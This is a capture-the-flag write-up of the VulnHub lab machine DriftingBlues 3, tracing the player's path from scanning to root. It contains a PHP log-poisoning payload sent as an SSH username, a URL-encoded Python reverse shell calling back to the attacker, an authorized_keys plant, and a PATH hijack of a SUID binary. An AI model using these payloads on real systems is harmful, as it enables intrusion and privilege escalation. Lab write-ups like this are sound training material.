# BOX NAME: DriftinbBlues 3
**LINK**: https://www.vulnhub.com/entry/driftingblues-3,656/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate the box until you find a misconfigured php site which reveals the auth.log and poison it.
2. Get on the box with a url-encoded reverse shell and enumerate. Find a SUID file but you have no permissions.
3. Pivot to the user freddie using SSH-keys
4. Detonate the SUID file
5. Manipulate the users PATH to make the SUID file give us root access.

This box was kind-of tricky. It let me down some rabbit-holes since the webroot was infested with drupal, wp-admin, phpmyadmin, secrets etc. Once I found the base64 hash it was smooth sailing. 
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.50
[+] URL:	http://driftingblues.box
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-db3.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 19:44 CEST
Nmap scan report for test.driftingblues.box (10.77.0.50)
Host is up (0.0024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6afed61723cb90792bb12d3753974658 (RSA)
|   256 5bc468d18959d748b096f311871c08ac (ECDSA)
|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/eventadmins
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.52 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
http://driftingblues.box [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.77.0.50]
```

nikto-scan

```
└─$ nikto -h $IP | tee nikto-db3.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.50
+ Target Hostname:    10.77.0.50
+ Target Port:        80
+ Start Time:         2023-04-26 19:44:23 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /robots.txt: Entry '/eventadmins/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 1 entry which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 55d, size: 5b80429e7f280, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /secret/: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wp-admin/: Directory indexing found.
+ /wp-admin/: Admin login page/section found.
+ /phpmyadmin/: phpMyAdmin directory found.
+ 8105 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2023-04-26 19:44:39 (GMT2) (16 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing

```
/secret
/eventsadmin
/littlequeenofspades.html
/phpmyadmin
/wp-admin
/adminsfixit.php - seems to be a ssh auth.log file | let's boink it, shall we?

ssh '<?php system($_GET["cmd"]);?>'@driftingblues.box

```
other

```
/littlequeenofspades.html has base64 string hidden in html-source

└─$ hURL -b 'aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ=='

Original string       :: aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==
base64 DEcoded string :: intruder? L2FkbWluc2ZpeGl0LnBocA==

└─$ hURL -b 'L2FkbWluc2ZpeGl0LnBocA=='                        

Original string       :: L2FkbWluc2ZpeGl0LnBocA==
base64 DEcoded string :: /adminsfixit.php
```
```
view-source:http://10.77.0.50/adminsfixit.php?cmd=ls%20-al

<!DOCTYPE html>
<html>
<body>
<p>#######################################################################</p>
<p>ssh auth log</p>
<p>============</p>
<p>i hope some wacky and uncharacteristic thing would not happen</p>
<p>this job is fucking poisonous and im boutta planck length away from quitting this hoe</p>
<p>-abuzer komurcu</p>
<p>#######################################################################</p>
<p> </p>
<p> </p>
</html>
Apr 26 12:42:47 driftingblues sshd[509]: Server listening on 0.0.0.0 port 22.
Apr 26 12:43:01 driftingblues CRON[740]: pam_unix(cron:session): session opened for user root by (uid=0)
Apr 26 12:43:01 driftingblues CRON[740]: pam_unix(cron:session): session closed for user root
Apr 26 12:44:02 driftingblues CRON[744]: pam_unix(cron:session): session opened for user root by (uid=0)
Apr 26 12:44:02 driftingblues CRON[744]: pam_unix(cron:session): session closed for user root
Apr 26 12:44:13 driftingblues sshd[749]: Did not receive identification string from 10.77.0.35 port 43134
Apr 26 12:44:19 driftingblues sshd[750]: Protocol major versions differ for 10.77.0.35 port 43140: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 vs. SSH-1.5-Nmap-SSH1-Hostkey
Apr 26 12:44:19 driftingblues sshd[751]: Protocol major versions differ for 10.77.0.35 port 43154: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 vs. SSH-1.5-NmapNSE_1.0
Apr 26 12:44:19 driftingblues sshd[752]: Unable to negotiate with 10.77.0.35 port 43164: no matching host key type found. Their offer: ssh-dss [preauth]
Apr 26 12:44:19 driftingblues sshd[754]: Connection closed by 10.77.0.35 port 43172 [preauth]
Apr 26 12:44:19 driftingblues sshd[756]: Connection closed by 10.77.0.35 port 43178 [preauth]
Apr 26 12:44:19 driftingblues sshd[758]: Unable to negotiate with 10.77.0.35 port 43184: no matching host key type found. Their offer: ecdsa-sha2-nistp384 [preauth]
Apr 26 12:44:19 driftingblues sshd[760]: Unable to negotiate with 10.77.0.35 port 43196: no matching host key type found. Their offer: ecdsa-sha2-nistp521 [preauth]
Apr 26 12:44:19 driftingblues sshd[762]: Connection closed by 10.77.0.35 port 43202 [preauth]
Apr 26 12:45:01 driftingblues CRON[766]: pam_unix(cron:session): session opened for user root by (uid=0)
Apr 26 12:45:01 driftingblues CRON[766]: pam_unix(cron:session): session closed for user root
Apr 26 12:46:01 driftingblues CRON[770]: pam_unix(cron:session): session opened for user root by (uid=0)
Apr 26 12:46:01 driftingblues CRON[770]: pam_unix(cron:session): session closed for user root
Apr 26 12:47:01 driftingblues CRON[774]: pam_unix(cron:session): session opened for user root by (uid=0)
Apr 26 12:47:01 driftingblues CRON[774]: pam_unix(cron:session): session closed for user root
Apr 26 12:48:01 driftingblues CRON[779]: pam_unix(cron:session): session opened for user root by (uid=0)
Apr 26 12:48:01 driftingblues CRON[779]: pam_unix(cron:session): session closed for user root
Apr 26 12:49:01 driftingblues CRON[784]: pam_unix(cron:session): session opened for user root by (uid=0)
Apr 26 12:49:01 driftingblues CRON[784]: pam_unix(cron:session): session closed for user root
Apr 26 12:49:59 driftingblues sshd[788]: Invalid user total 2028
drwxr-xr-x 8 root root    4096 Jan  4  2021 .
drwxr-xr-x 3 root root    4096 Dec 17  2020 ..
-rw-r--r-- 1 root root      11 Jan  4  2021 MANIFEST.MF
-rw-r--r-- 1 root root      11 Jan  4  2021 Makefile
-rw-r--r-- 1 root root    3466 Apr 26 12:50 adminsfixit.php
-rw-r--r-- 1 root root 2014591 Jan  3  2021 cr.png
drwxr-xr-x 2 root root    4096 Jan  4  2021 drupal
drwxr-xr-x 2 root root    4096 Jan  4  2021 eventadmins
-rw-r--r-- 1 root root    1373 Jan  3  2021 index.html
-rw-r--r-- 1 root root    1314 Jan  4  2021 littlequeenofspades.html
drwxr-xr-x 2 root root    4096 Jan  4  2021 phpmyadmin
drwxr-xr-x 2 root root    4096 Jan  4  2021 privacy
-rw-r--r-- 1 root root      37 Jan  3  2021 robots.txt
drwxr-xr-x 2 root root    4096 Jan  4  2021 secret
-rw-r--r-- 1 root root     347 Jan  3  2021 tickets.html
drwxr-xr-x 2 root root    4096 Jan  4  2021 wp-admin
 from 10.77.0.35 port 60072
Apr 26 12:49:59 driftingblues sshd[788]: Connection closed by invalid user total 2028
drwxr-xr-x 8 root root    4096 Jan  4  2021 .
drwxr-xr-x 3 root root    4096 Dec 17  2020 ..
-rw-r--r-- 1 root root      11 Jan  4  2021 MANIFEST.MF
-rw-r--r-- 1 root root      11 Jan  4  2021 Makefile
-rw-r--r-- 1 root root    3466 Apr 26 12:50 adminsfixit.php
-rw-r--r-- 1 root root 2014591 Jan  3  2021 cr.png
drwxr-xr-x 2 root root    4096 Jan  4  2021 drupal
drwxr-xr-x 2 root root    4096 Jan  4  2021 eventadmins
-rw-r--r-- 1 root root    1373 Jan  3  2021 index.html
-rw-r--r-- 1 root root    1314 Jan  4  2021 littlequeenofspades.html
drwxr-xr-x 2 root root    4096 Jan  4  2021 phpmyadmin
drwxr-xr-x 2 root root    4096 Jan  4  2021 privacy
-rw-r--r-- 1 root root      37 Jan  3  2021 robots.txt
drwxr-xr-x 2 root root    4096 Jan  4  2021 secret
-rw-r--r-- 1 root root     347 Jan  3  2021 tickets.html
drwxr-xr-x 2 root root    4096 Jan  4  2021 wp-admin
 10.77.0.35 port 60072 [preauth]
Apr 26 12:50:01 driftingblues CRON[790]: pam_unix(cron:session): session opened for user root by (uid=0)
```

</details>
<details><summary><ins>OTHER</ins></summary>

Compromise the box
```
view-source:http://10.77.0.50/adminsfixit.php?cmd=%2Fusr%2Fbin%2Fpython%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.77.0.35%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27
```
Stabalize the shell
```
export TERM=xterm-256color
alias ll="ls --color=auto -lshat"
#do the regret
CTRL+Z
# zsh
stty columns 500 rows 500
stty raw -echo ; fg ; reset
```
</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/usr/bin/getinfo
```

**SUID's**:

```
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/getinfo <---
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
```
**SGID's**:

```
/usr/bin/crontab
/usr/bin/chage
/usr/bin/getinfo
/usr/bin/wall
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/ssh-agent
/usr/bin/dotlockfile
/usr/sbin/unix_chkpwd
```
**OTHERS**:

seems the .ssh directory is world-readable again i robertj's home.
```
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLp3knrFZzugGD/KhhekVQC1HnqbHeJZwYyebReAJ4e7BM0/yAG4nM1jExgc/wMJj1rrd+iIKv5sBwRt7DS/EU+q+37j2wGOu+A1JeooBs4Trpqq7ZZnPgYyphBILA0TMrctCrKm++Lgm0zYGsG1DMqGqHDGfkGw8wR+cIeTNJqihSloCMV6ekPAe1+FMB4n5WkGFjxZOBdGg71yEgAr2VjLPyvs9K+jyuqC/freGYBT1w8uO57T7ZQAgYW54mxWlCShLx19ScHPHUcgu7mkp1zJXboQ2XiDjRna0hihp6BiM01h37Wo8r9cdGoIeOf3RFMTHklho+XraNkCB+OX7pKFGTWYdv/VbslPxD5QIIdvTI6uvPExhYruLp2XBJsZz+vS/GXUVHaKshAQU9ZfiyaHTYBCuBOpsyzRsjiuKcryh8/3r3eq4pWmg7gWarmcImkIDEuSwarpORTrFvO0Lmr1aDKb4+hZsHM0WR/YtdASSSXkeRbstMUyOw9vv+VmM=' > authorized_keys

└─$ ssh -i id_rsa robertj@$IP
The authenticity of host '10.77.0.50 (10.77.0.50)' can't be established.
ED25519 key fingerprint is SHA256:P07e9iTTwbyQae7lGtYu8i4toAyBfYkXY9/kw/dyv/4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:37: [hashed name]
    ~/.ssh/known_hosts:39: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.77.0.50' (ED25519) to the list of known hosts.
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
robertj@driftingblues:~$
```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
/bin/bash: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ffe165dc81a64aea2b05beda07aeda8ad71f1e7c, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster


Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
robertj:
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
robertj@driftingblues:/tmp$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
robertj@driftingblues:/tmp$ export PATH=/tmp:$PATH
robertj@driftingblues:/tmp$ /usr/bin/getinfo
###################
ip address
###################

root@driftingblues:/tmp# id
uid=0(root) gid=1000(robertj) groups=1000(robertj),1001(operators)
root@driftingblues:/tmp# 

```
```
robertj@driftingblues:~$ cat user.txt 
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█


```
```
root@driftingblues:/root# cat root.txt 
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!

```
</details>